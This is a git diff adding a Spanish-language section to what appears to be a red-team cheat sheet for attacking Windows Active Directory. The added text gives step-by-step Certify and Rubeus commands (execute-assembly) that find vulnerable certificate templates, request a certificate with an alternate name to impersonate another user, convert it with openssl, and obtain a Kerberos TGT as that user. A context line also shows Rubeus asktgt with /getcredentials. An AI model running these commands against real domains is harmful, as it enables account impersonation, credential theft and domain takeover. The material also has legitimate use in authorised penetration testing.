@@ -406,3 +406,27 @@ Coger el hash NTLM y hacer PTH
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:certificado /password:"Vt1E6BzV8qehrqkn" /domain:dominio /dc:equipo.dominio /getcredentials /show
 ```
+
+# Active Directory Certificate Services (ADCS)
+
+## Misconfigured Certificate Templates
+
+Encontrar un certificado vulnerable
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
+```
+Solicitar un certificado
+```
+execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:nombre_certificado /template:template /altname:usuario_a_impersonar
+```
+Copiar todo el certificado y ponerlo en un .pem, luego convertirlo a pfx (en un Linux)
+```
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
+Pasarlo a Rubeus en base64 para solicitar un TGT
+```
+cat cert.pfx | base64 -w 0
+```
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:usuario_a_impersonar /certificate:base64 /password:pass_elegida /nowrap
+```
